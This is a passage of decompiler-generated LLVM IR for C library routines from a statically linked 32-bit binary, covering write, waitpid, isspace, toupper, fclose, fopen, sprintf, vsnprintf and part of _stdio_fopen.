  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80507ec = load i32, i32* @edi, align 4
  store i32 %v0_80507ec, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_80507f4 = load i32, i32* @ebx, align 4
  %v2_80507fc = call i32 @time(i32* %arg1)
  store i32 %v0_80507f4, i32* @ebx, align 4
  store i32 %v2_80507fc, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_80507fc, -4095
  br i1 %tmp9, label %dec_label_pc_8050814, label %dec_label_pc_8050808

dec_label_pc_8050808:                             ; preds = %entry
  %v1_8050808 = call i32 @__errno_location(i32 %v0_80507f4)
  %v0_805080d = load i32, i32* %edi.global-to-local, align 4
  %v1_805080d = sub i32 0, %v0_805080d
  %v2_805080f = inttoptr i32 %v1_8050808 to i32*
  store i32 %v1_805080d, i32* %v2_805080f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050814

dec_label_pc_8050814:                             ; preds = %entry, %dec_label_pc_8050808
  %v0_8050814 = phi i32 [ %v2_80507fc, %entry ], [ -1, %dec_label_pc_8050808 ]
  %v2_8050816 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050816, i32* @edx, align 4
  %v2_8050818 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050818, i32* @edi, align 4
  ret i32 %v0_8050814

; uselistorder directives
  uselistorder i32 %v2_80507fc, { 1, 0, 2 }
  uselistorder i32 %v0_80507f4, { 1, 0 }
  uselistorder label %dec_label_pc_8050814, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_805082d = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_805082d
}

define i32 @__libc_write(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050838 = load i32, i32* @edi, align 4
  store i32 %v0_8050838, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8050848 = load i32, i32* @ebx, align 4
  %v4_8050850 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8050848, i32* @ebx, align 4
  store i32 %v4_8050850, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_8050850, -4095
  br i1 %tmp11, label %dec_label_pc_8050868, label %dec_label_pc_805085c

dec_label_pc_805085c:                             ; preds = %entry
  %v1_805085c = call i32 @__errno_location(i32 %v0_8050848)
  %v0_8050861 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050861 = sub i32 0, %v0_8050861
  %v2_8050863 = inttoptr i32 %v1_805085c to i32*
  store i32 %v1_8050861, i32* %v2_8050863, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050868

dec_label_pc_8050868:                             ; preds = %entry, %dec_label_pc_805085c
  %v0_8050868 = phi i32 [ %v4_8050850, %entry ], [ -1, %dec_label_pc_805085c ]
  %v2_805086a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805086a, i32* @edx, align 4
  %v2_805086c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805086c, i32* @edi, align 4
  ret i32 %v0_8050868

; uselistorder directives
  uselistorder i32 %v4_8050850, { 1, 0, 2 }
  uselistorder i32 %v0_8050848, { 1, 0 }
  uselistorder label %dec_label_pc_8050868, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8050874 = load i32, i32* inttoptr (i32 134591128 to i32*), align 8
  %v2_8050879 = mul i32 %arg1, 2
  %v3_8050879 = add i32 %v0_8050874, %v2_8050879
  %v4_8050879 = inttoptr i32 %v3_8050879 to i16*
  %v5_8050879 = load i16, i16* %v4_8050879, align 2
  %v6_8050879 = zext i16 %v5_8050879 to i32
  %v1_805087d = and i32 %v6_8050879, 32
  ret i32 %v1_805087d
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_8050888 = add i32 %arg1, 128
  %v6_8050893 = icmp ugt i32 %v1_8050888, 383
  br i1 %v6_8050893, label %dec_label_pc_805089e, label %dec_label_pc_8050895

dec_label_pc_8050895:                             ; preds = %entry
  %v0_8050895 = load i32, i32* inttoptr (i32 134591136 to i32*), align 32
  %v2_805089a = mul i32 %arg1, 2
  %v3_805089a = add i32 %v0_8050895, %v2_805089a
  %v4_805089a = inttoptr i32 %v3_805089a to i16*
  %v5_805089a = load i16, i16* %v4_805089a, align 2
  %v6_805089a = sext i16 %v5_805089a to i32
  store i32 %v6_805089a, i32* @edx, align 4
  br label %dec_label_pc_805089e

dec_label_pc_805089e:                             ; preds = %entry, %dec_label_pc_8050895
  %v0_805089e = phi i32 [ %arg1, %entry ], [ %v6_805089a, %dec_label_pc_8050895 ]
  ret i32 %v0_805089e

; uselistorder directives
  uselistorder label %dec_label_pc_805089e, { 1, 0 }
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_80617a0.463 to i32)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80508ac = load i32, i32* @ebp, align 4
  %v0_80508ad = load i32, i32* @edi, align 4
  %v0_80508ae = load i32, i32* @esi, align 4
  %v0_80508af = load i32, i32* @ebx, align 4
  %v4_80508b3 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80508b3, i32* @esi, align 4
  %v1_80508b7 = add i32 %v4_80508b3, 52
  %v2_80508b7 = inttoptr i32 %v1_80508b7 to i32*
  %v3_80508b7 = load i32, i32* %v2_80508b7, align 4
  store i32 %v3_80508b7, i32* @ebp, align 4
  %v1_80508ba = icmp eq i32 %v3_80508b7, 0
  %v1_80508bc = icmp eq i1 %v1_80508ba, false
  br i1 %v1_80508bc, label %dec_label_pc_80508dd, label %dec_label_pc_80508be

dec_label_pc_80508be:                             ; preds = %entry
  %v1_80508be = add i32 %v4_80508b3, 56
  store i32 %v1_80508be, i32* @ebx, align 4
  %v2_80508c8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80508c8, i32* @eax, align 4
  %v2_80508cd = call i32 @__pthread_return_void(i32 %v2_80508c8, i32 134562611)
  %v0_80508d2 = load i32, i32* @ebx, align 4
  %v1_80508d5 = call i32 @__pthread_return_0(i32 %v0_80508d2)
  store i32 %v1_80508d5, i32* @eax, align 4
  %v0_80508df.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80508dd

dec_label_pc_80508dd:                             ; preds = %entry, %dec_label_pc_80508be
  %v0_80508e7 = phi i32 [ %v4_80508b3, %entry ], [ %v0_80508df.pre, %dec_label_pc_80508be ]
  store i32 0, i32* @edi, align 4
  %v1_80508df = inttoptr i32 %v0_80508e7 to i8*
  %v2_80508df = load i8, i8* %v1_80508df, align 1
  %v3_80508df = and i8 %v2_80508df, 64
  %v4_80508df = icmp eq i8 %v3_80508df, 0
  br i1 %v4_80508df, label %dec_label_pc_80508dd.dec_label_pc_80508f2_crit_edge, label %dec_label_pc_80508e4

dec_label_pc_80508dd.dec_label_pc_80508f2_crit_edge: ; preds = %dec_label_pc_80508dd
  br label %dec_label_pc_80508f2

dec_label_pc_80508e4:                             ; preds = %dec_label_pc_80508dd
  %v1_80508e8 = inttoptr i32 %v0_80508e7 to i16*
  %v2_80508e8 = call i32 @fflush_unlocked(i16* %v1_80508e8)
  store i32 %v2_80508e8, i32* @edi, align 4
  %v0_80508f5.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80508f2

dec_label_pc_80508f2:                             ; preds = %dec_label_pc_80508dd.dec_label_pc_80508f2_crit_edge, %dec_label_pc_80508e4
  %v0_80508f5 = phi i32 [ %v0_80508e7, %dec_label_pc_80508dd.dec_label_pc_80508f2_crit_edge ], [ %v0_80508f5.pre, %dec_label_pc_80508e4 ]
  %v1_80508f5 = add i32 %v0_80508f5, 4
  %v2_80508f5 = inttoptr i32 %v1_80508f5 to i32*
  %v3_80508f5 = load i32, i32* %v2_80508f5, align 4
  %v1_80508f8 = call i32 @__libc_close(i32 %v3_80508f5)
  store i32 %v1_80508f8, i32* @eax, align 4
  %v2_8050900 = icmp slt i32 %v1_80508f8, 0
  %v1_8050902 = icmp eq i1 %v2_8050900, false
  br i1 %v1_8050902, label %dec_label_pc_8050907, label %dec_label_pc_8050904

dec_label_pc_8050904:                             ; preds = %dec_label_pc_80508f2
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_8050907

dec_label_pc_8050907:                             ; preds = %dec_label_pc_80508f2, %dec_label_pc_8050904
  %v0_8050907 = load i32, i32* @esi, align 4
  %v1_8050907 = add i32 %v0_8050907, 4
  %v2_8050907 = inttoptr i32 %v1_8050907 to i32*
  store i32 -1, i32* %v2_8050907, align 4
  %v2_8050919 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8050919, i32* @ebx, align 4
  %v2_805091e = call i32 @__pthread_return_void(i32 %v2_8050919, i32 134562611)
  %v1_805092a = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b2d4.464 to i32))
  %v0_805092f = load i32, i32* @global_var_805f564.465, align 4
  %v1_8050934 = add i32 %v0_805092f, 1
  store i32 %v1_8050934, i32* @global_var_805f564.465, align 4
  store i32 ptrtoint (i32* @global_var_805b2d4.464 to i32), i32* @eax, align 4
  %v2_805093f = call i32 @__pthread_return_void(i32 %v2_8050919, i32 1)
  store i32 %v2_805093f, i32* @eax, align 4
  %v0_8050947 = load i32, i32* @esi, align 4
  %v1_8050947 = inttoptr i32 %v0_8050947 to i16*
  %v2_8050947 = load i16, i16* %v1_8050947, align 2
  %v3_8050947 = and i16 %v2_8050947, 24576
  store i16 %v3_8050947, i16* %v1_8050947, align 2
  %v0_805094c = load i32, i32* @esi, align 4
  %v1_805094c = inttoptr i32 %v0_805094c to i16*
  %v2_805094c = load i16, i16* %v1_805094c, align 2
  %v3_805094c = or i16 %v2_805094c, 48
  store i16 %v3_805094c, i16* %v1_805094c, align 2
  br i1 %v1_80508bc, label %dec_label_pc_8050965, label %dec_label_pc_8050954

dec_label_pc_8050954:                             ; preds = %dec_label_pc_8050907
  %v2_8050958 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050958, i32* @eax, align 4
  %v2_805095d = call i32 @__pthread_return_void(i32 %v2_8050958, i32 1)
  store i32 %v2_805095d, i32* @eax, align 4
  br label %dec_label_pc_8050965

dec_label_pc_8050965:                             ; preds = %dec_label_pc_8050907, %dec_label_pc_8050954
  %v0_8050965 = load i32, i32* @esi, align 4
  %v1_8050965 = add i32 %v0_8050965, 1
  %v2_8050965 = inttoptr i32 %v1_8050965 to i8*
  %v3_8050965 = load i8, i8* %v2_8050965, align 1
  %v4_8050965 = and i8 %v3_8050965, 64
  %v5_8050965 = icmp eq i8 %v4_8050965, 0
  br i1 %v5_8050965, label %dec_label_pc_8050979, label %dec_label_pc_805096b

dec_label_pc_805096b:                             ; preds = %dec_label_pc_8050965
  %v1_805096e = add i32 %v0_8050965, 8
  %v2_805096e = inttoptr i32 %v1_805096e to i32*
  %v3_805096e = load i32, i32* %v2_805096e, align 4
  %v1_8050971 = call i32 @free(i32 %v3_805096e)
  store i32 %v1_8050971, i32* @eax, align 4
  br label %dec_label_pc_8050979

dec_label_pc_8050979:                             ; preds = %dec_label_pc_8050965, %dec_label_pc_805096b
  %v2_8050985 = call i32 @__pthread_return_void(i32 %v2_8050919, i32 134562611)
  %v1_8050991 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b2d4.464 to i32))
  store i32 ptrtoint (i32* @global_var_805b2d4.464 to i32), i32* @eax, align 4
  %v0_8050998 = load i32, i32* @global_var_805f568.466, align 8
  %v1_8050998 = add i32 %v0_8050998, 1
  store i32 %v1_8050998, i32* @global_var_805f568.466, align 8
  %v2_80509a1 = call i32 @__pthread_return_void(i32 %v2_8050919, i32 1)
  %v0_80509a6 = call i32 @_stdio_openlist_dec_use()
  %v0_80509ae = load i32, i32* @edi, align 4
  store i32 %v0_80508af, i32* @ebx, align 4
  store i32 %v0_80508ae, i32* @esi, align 4
  store i32 %v0_80508ad, i32* @edi, align 4
  store i32 %v0_80508ac, i32* @ebp, align 4
  ret i32 %v0_80509ae

; uselistorder directives
  uselistorder label %dec_label_pc_8050979, { 1, 0 }
  uselistorder label %dec_label_pc_8050965, { 1, 0 }
  uselistorder label %dec_label_pc_8050907, { 1, 0 }
  uselistorder label %dec_label_pc_80508f2, { 1, 0 }
  uselistorder label %dec_label_pc_80508dd, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_80509c7 = inttoptr i32 %arg2 to i8*
  %v5_80509c7 = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_80509c7, i32 0, i32 -1)
  ret i32 %v5_80509c7
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_80509d3 = ptrtoint i32* %stack_var_12 to i32
  %v4_80509e6 = inttoptr i32 %arg1 to i8*
  %v5_80509e6 = call i32 @__GI_vsnprintf(i8* %v4_80509e6, i32 -1, i32 %arg2, i32 %v2_80509d3)
  ret i32 %v5_80509e6
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80509f0 = load i32, i32* @ebp, align 4
  %v0_80509f1 = load i32, i32* @edi, align 4
  %v0_80509f2 = load i32, i32* @esi, align 4
  %v0_80509f3 = load i32, i32* @ebx, align 4
  store i32 %v0_80509f3, i32* %stack_var_-16, align 4
  %v4_80509f7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80509f7, i32* @esi, align 4
  %v2_80509fb = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v2_8050a2c = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_8050a2c, i32* @ebp, align 4
  %v1_8050a30 = sub i32 -1, %v4_80509f7
  store i32 %v1_8050a30, i32* @ebx, align 4
  %v1_8050a33 = call i32 @__stdio_init_mutex(i32 %v2_80509fb)
  %v0_8050a43 = load i32, i32* @ebx, align 4
  %v1_8050a43 = load i32, i32* @edi, align 4
  %tmp35 = icmp ugt i32 %v0_8050a43, %v1_8050a43
  br i1 %tmp35, label %dec_label_pc_8050a47, label %dec_label_pc_8050a49

dec_label_pc_8050a47:                             ; preds = %entry
  store i32 %v1_8050a43, i32* @ebx, align 4
  br label %dec_label_pc_8050a49

dec_label_pc_8050a49:                             ; preds = %entry, %dec_label_pc_8050a47
  %v1_8050a49 = phi i32 [ %v0_8050a43, %entry ], [ %v1_8050a43, %dec_label_pc_8050a47 ]
  %v0_8050a49 = load i32, i32* @esi, align 4
  %v2_8050a49 = add i32 %v0_8050a49, %v1_8050a49
  %v4_8050a74 = inttoptr i32 %arg3 to i8*
  %v5_8050a74 = call i32 @_vfprintf_internal(i32 %v2_8050a2c, i8* %v4_8050a74, i32 %arg4, i32 %v2_8050a49)
  store i32 %v5_8050a74, i32* @edx, align 4
  %v0_8050a7e = load i32, i32* @ebx, align 4
  %v1_8050a7e = icmp eq i32 %v0_8050a7e, 0
  br i1 %v1_8050a7e, label %dec_label_pc_8050a98, label %dec_label_pc_8050a82

dec_label_pc_8050a82:                             ; preds = %dec_label_pc_8050a49
  %v16_8050a86 = icmp eq i32 %v1_8050a49, 0
  %v1_8050a8a = icmp eq i1 %v16_8050a86, false
  br i1 %v1_8050a8a, label %dec_label_pc_8050a91, label %dec_label_pc_8050a8c

dec_label_pc_8050a8c:                             ; preds = %dec_label_pc_8050a82
  %v1_8050a8c = add i32 %v2_8050a49, -1
  br label %dec_label_pc_8050a91

dec_label_pc_8050a91:                             ; preds = %dec_label_pc_8050a82, %dec_label_pc_8050a8c
  %stack_var_-80.0.in = phi i32 [ %v0_8050a49, %dec_label_pc_8050a82 ], [ %v1_8050a8c, %dec_label_pc_8050a8c ]
  %stack_var_-80.0 = inttoptr i32 %stack_var_-80.0.in to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_8050a9b.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050a98

dec_label_pc_8050a98:                             ; preds = %dec_label_pc_8050a49, %dec_label_pc_8050a91
  %v0_8050a9b = phi i32 [ %v5_8050a74, %dec_label_pc_8050a49 ], [ %v0_8050a9b.pre, %dec_label_pc_8050a91 ]
  %v2_8050a9d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050a9d, i32* @ebx, align 4
  store i32 %v0_80509f2, i32* @esi, align 4
  store i32 %v0_80509f1, i32* @edi, align 4
  store i32 %v0_80509f0, i32* @ebp, align 4
  ret i32 %v0_8050a9b

; uselistorder directives
  uselistorder i32 %v0_8050a49, { 1, 0 }
  uselistorder i32 %v1_8050a49, { 1, 0 }
  uselistorder i32 %v1_8050a43, { 1, 2, 0 }
  uselistorder i32 %v0_8050a43, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder i32 208, { 1, 0 }
  uselistorder label %dec_label_pc_8050a98, { 1, 0 }
  uselistorder label %dec_label_pc_8050a91, { 1, 0 }
  uselistorder label %dec_label_pc_8050a49, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050aa4 = load i32, i32* @ebp, align 4
  %v0_8050aa5 = load i32, i32* @edi, align 4
  %v0_8050aa6 = load i32, i32* @esi, align 4
  %v0_8050aa7 = load i32, i32* @ebx, align 4
  store i32 %v0_8050aa7, i32* %stack_var_-16, align 4
  %v4_8050aab = ptrtoint i8* %arg2 to i32
  store i32 %v4_8050aab, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_8050abb = load i8, i8* %arg2, align 1
  %v3_8050abb = zext i8 %v2_8050abb to i32
  %v4_8050abb = load i32, i32* @eax, align 4
  %v5_8050abb = and i32 %v4_8050abb, -256
  %v6_8050abb = or i32 %v5_8050abb, %v3_8050abb
  store i32 %v6_8050abb, i32* %eax.global-to-local, align 4
  %v10_8050abd = icmp eq i8 %v2_8050abb, 114
  br i1 %v10_8050abd, label %dec_label_pc_8050aff, label %dec_label_pc_8050ac1

dec_label_pc_8050ac1:                             ; preds = %entry
  store i32 577, i32* @ebx, align 4
  %v10_8050ac6 = icmp eq i8 %v2_8050abb, 119
  br i1 %v10_8050ac6, label %dec_label_pc_8050b01, label %dec_label_pc_8050aca

dec_label_pc_8050aca:                             ; preds = %dec_label_pc_8050ac1
  store i32 1089, i32* @ebx, align 4
  %v10_8050ace = icmp eq i8 %v2_8050abb, 97
  br i1 %v10_8050ace, label %dec_label_pc_8050b01, label %dec_label_pc_8050ad2

dec_label_pc_8050ad2:                             ; preds = %dec_label_pc_8050b7a, %dec_label_pc_8050b54, %dec_label_pc_8050aca
  %v0_8050ad2 = load i32, i32* %stack_var_-16, align 4
  %v1_8050ad2 = call i32 @__errno_location(i32 %v0_8050ad2)
  store i32 %v1_8050ad2, i32* %eax.global-to-local, align 4
  %v0_8050ad7 = load i32, i32* @ebp, align 4
  %v1_8050ad7 = icmp eq i32 %v0_8050ad7, 0
  %v1_8050ad9 = inttoptr i32 %v1_8050ad2 to i32*
  store i32 22, i32* %v1_8050ad9, align 4
  br i1 %v1_8050ad7, label %dec_label_pc_8050cc7, label %dec_label_pc_8050ae5

dec_label_pc_8050ae5:                             ; preds = %dec_label_pc_8050ba3, %dec_label_pc_8050ad2
  %v0_8050ae5 = load i32, i32* @ebp, align 4
  %v1_8050ae5 = add i32 %v0_8050ae5, 1
  %v2_8050ae5 = inttoptr i32 %v1_8050ae5 to i8*
  %v3_8050ae5 = load i8, i8* %v2_8050ae5, align 1
  %v4_8050ae5 = and i8 %v3_8050ae5, 32
  %v5_8050ae5 = icmp eq i8 %v4_8050ae5, 0
  br i1 %v5_8050ae5, label %dec_label_pc_8050cc7, label %dec_label_pc_8050aef

dec_label_pc_8050aef:                             ; preds = %dec_label_pc_8050ae5
  store i32 %v0_8050ae5, i32* %stack_var_-76, align 4
  %v1_8050af3 = call i32 @free(i32 %v0_8050ae5)
  store i32 %v1_8050af3, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8050cc2

dec_label_pc_8050aff:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8050b01

dec_label_pc_8050b01:                             ; preds = %dec_label_pc_8050aca, %dec_label_pc_8050ac1, %dec_label_pc_8050aff
  %v0_8050b12 = phi i32 [ 1089, %dec_label_pc_8050aca ], [ 577, %dec_label_pc_8050ac1 ], [ 1, %dec_label_pc_8050aff ]
  %v1_8050b01 = add i32 %v4_8050aab, 1
  store i32 %v1_8050b01, i32* %eax.global-to-local, align 4
  %v2_8050b04 = inttoptr i32 %v1_8050b01 to i8*
  %v3_8050b04 = load i8, i8* %v2_8050b04, align 1
  %v12_8050b04 = icmp eq i8 %v3_8050b04, 98
  br i1 %v12_8050b04, label %dec_label_pc_8050b0c, label %dec_label_pc_8050b0a

dec_label_pc_8050b0a:                             ; preds = %dec_label_pc_8050b01
  store i32 %v4_8050aab, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050b0c

dec_label_pc_8050b0c:                             ; preds = %dec_label_pc_8050b01, %dec_label_pc_8050b0a
  %v0_8050b0c = phi i32 [ %v1_8050b01, %dec_label_pc_8050b01 ], [ %v4_8050aab, %dec_label_pc_8050b0a ]
  %v1_8050b0c = add i32 %v0_8050b0c, 1
  %v2_8050b0c = inttoptr i32 %v1_8050b0c to i8*
  %v3_8050b0c = load i8, i8* %v2_8050b0c, align 1
  %v12_8050b0c = icmp eq i8 %v3_8050b0c, 43
  %v1_8050b10 = icmp eq i1 %v12_8050b0c, false
  br i1 %v1_8050b10, label %dec_label_pc_8050b1a, label %dec_label_pc_8050b12

dec_label_pc_8050b12:                             ; preds = %dec_label_pc_8050b0c
  store i32 %v0_8050b12, i32* %eax.global-to-local, align 4
  %v1_8050b17 = add nuw nsw i32 %v0_8050b12, 1
  store i32 %v1_8050b17, i32* @ebx, align 4
  br label %dec_label_pc_8050b1a

dec_label_pc_8050b1a:                             ; preds = %dec_label_pc_8050b0c, %dec_label_pc_8050b12
  %v1_8050b1a = icmp eq i32 %arg3, 0
  %v1_8050b1c = icmp eq i1 %v1_8050b1a, false
  br i1 %v1_8050b1c, label %dec_label_pc_8050b50, label %dec_label_pc_8050b1e

dec_label_pc_8050b1e:                             ; preds = %dec_label_pc_8050b1a
  store i32 80, i32* %stack_var_-76, align 4
  %v1_8050b23 = call i32 @malloc(i32 80)
  store i32 %v1_8050b23, i32* %eax.global-to-local, align 4
  store i32 %v1_8050b23, i32* @ebp, align 4
  %v2_8050b2d = icmp eq i32 %v1_8050b23, 0
  br i1 %v2_8050b2d, label %dec_label_pc_8050cc9, label %dec_label_pc_8050b35

dec_label_pc_8050b35:                             ; preds = %dec_label_pc_8050b1e
  %v2_8050b23 = inttoptr i32 %v1_8050b23 to i16*
  store i16 8192, i16* %v2_8050b23, align 2
  %v2_8050b3d = add i32 %v1_8050b23, 8
  %v3_8050b3d = inttoptr i32 %v2_8050b3d to i32*
  store i32 0, i32* %v3_8050b3d, align 4
  %v2_8050b44 = add i32 %v1_8050b23, 56
  store i32 %v2_8050b44, i32* %eax.global-to-local, align 4
  store i32 %v2_8050b44, i32* %stack_var_-76, align 4
  %v1_8050b48 = call i32 @__stdio_init_mutex(i32 %v2_8050b44)
  store i32 %v1_8050b48, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050b50

dec_label_pc_8050b50:                             ; preds = %dec_label_pc_8050b1a, %dec_label_pc_8050b35
  %v2_8050b50 = icmp slt i32 %arg4, 0
  br i1 %v2_8050b50, label %dec_label_pc_8050b9d, label %dec_label_pc_8050b54

dec_label_pc_8050b54:                             ; preds = %dec_label_pc_8050b50
  %v0_8050b54 = load i32, i32* @ebx, align 4
  %v0_8050b56 = load i32, i32* @esi, align 4
  %v1_8050b56 = add i32 %v0_8050b56, 1
  store i32 %v1_8050b56, i32* %eax.global-to-local, align 4
  %v1_8050b59 = and i32 %v0_8050b54, 32771
  store i32 %v1_8050b59, i32* %edx.global-to-local, align 4
  %v1_8050b5f = load i32, i32* @ebp, align 4
  %v2_8050b5f = add i32 %v1_8050b5f, 4
  %v3_8050b5f = inttoptr i32 %v2_8050b5f to i32*
  store i32 %arg4, i32* %v3_8050b5f, align 4
  %v0_8050b62 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050b62 = add i32 %v0_8050b62, 1
  store i32 %v1_8050b62, i32* @edx, align 4
  %v0_8050b63 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050b63 = and i32 %v0_8050b63, %v1_8050b62
  store i32 %v2_8050b63, i32* %eax.global-to-local, align 4
  %v12_8050b65 = icmp eq i32 %v2_8050b63, %v1_8050b62
  %v1_8050b67 = icmp eq i1 %v12_8050b65, false
  br i1 %v1_8050b67, label %dec_label_pc_8050ad2, label %dec_label_pc_8050b6d

dec_label_pc_8050b6d:                             ; preds = %dec_label_pc_8050b54
  %v0_8050b6d = load i32, i32* @esi, align 4
  %v1_8050b6f = and i32 %v0_8050b6d, 1024
  %v1_8050b71 = xor i32 %v1_8050b6f, 1024
  store i32 %v1_8050b71, i32* %eax.global-to-local, align 4
  %v1_8050b76 = load i32, i32* @ebx, align 4
  %v2_8050b76 = and i32 %v1_8050b76, %v1_8050b71
  %v3_8050b76 = icmp eq i32 %v2_8050b76, 0
  br i1 %v3_8050b76, label %dec_label_pc_8050b6d.dec_label_pc_8050b93_crit_edge, label %dec_label_pc_8050b7a

dec_label_pc_8050b6d.dec_label_pc_8050b93_crit_edge: ; preds = %dec_label_pc_8050b6d
  br label %dec_label_pc_8050b93

dec_label_pc_8050b7a:                             ; preds = %dec_label_pc_8050b6d
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_8050b83 = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_8050b83, i32* %eax.global-to-local, align 4
  %v1_8050b8b = icmp eq i32 %v3_8050b83, 0
  %v1_8050b8d = icmp eq i1 %v1_8050b8b, false
  br i1 %v1_8050b8d, label %dec_label_pc_8050ad2, label %dec_label_pc_8050b7a.dec_label_pc_8050b93_crit_edge

dec_label_pc_8050b7a.dec_label_pc_8050b93_crit_edge: ; preds = %dec_label_pc_8050b7a
  %v0_8050b93.pre = load i32, i32* @esi, align 4
  %v0_8050b99.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050b93

dec_label_pc_8050b93:                             ; preds = %dec_label_pc_8050b6d.dec_label_pc_8050b93_crit_edge, %dec_label_pc_8050b7a.dec_label_pc_8050b93_crit_edge
  %v0_8050b99 = phi i32 [ %v1_8050b76, %dec_label_pc_8050b6d.dec_label_pc_8050b93_crit_edge ], [ %v0_8050b99.pre, %dec_label_pc_8050b7a.dec_label_pc_8050b93_crit_edge ]
  %v0_8050b93 = phi i32 [ %v0_8050b6d, %dec_label_pc_8050b6d.dec_label_pc_8050b93_crit_edge ], [ %v0_8050b93.pre, %dec_label_pc_8050b7a.dec_label_pc_8050b93_crit_edge ]
  %v1_8050b93 = and i32 %v0_8050b93, 32768
  %v2_8050b99 = or i32 %v1_8050b93, %v0_8050b99
  store i32 %v2_8050b99, i32* @ebx, align 4
  br label %dec_label_pc_8050bbe

dec_label_pc_8050b9d:                             ; preds = %dec_label_pc_8050b50
  %v1_8050b9d = add i32 %arg4, 1
  %v8_8050b9d = icmp eq i32 %v1_8050b9d, 0
  store i32 %v1_8050b9d, i32* @edi, align 4
  %v0_8050ba9.pre = load i32, i32* @ebx, align 4
  br i1 %v8_8050b9d, label %dec_label_pc_8050ba3, label %dec_label_pc_8050ba0

dec_label_pc_8050ba0:                             ; preds = %dec_label_pc_8050b9d
  %v11_8050ba0 = or i32 %v0_8050ba9.pre, 32768
  store i32 %v11_8050ba0, i32* @ebx, align 4
  br label %dec_label_pc_8050ba3

dec_label_pc_8050ba3:                             ; preds = %dec_label_pc_8050b9d, %dec_label_pc_8050ba0
  %v0_8050ba9 = phi i32 [ %v11_8050ba0, %dec_label_pc_8050ba0 ], [ %v0_8050ba9.pre, %dec_label_pc_8050b9d ]
  %v0_8050baa = load i32, i32* @esi, align 4
  store i32 %v0_8050baa, i32* %stack_var_-76, align 4
  %v3_8050bab = inttoptr i32 %v0_8050baa to i8*
  %v4_8050bab = call i32 @__libc_open(i8* %v3_8050bab, i32 %v0_8050ba9)
  store i32 %v4_8050bab, i32* %eax.global-to-local, align 4
  %v1_8050bb3 = load i32, i32* @ebp, align 4
  %v2_8050bb3 = add i32 %v1_8050bb3, 4
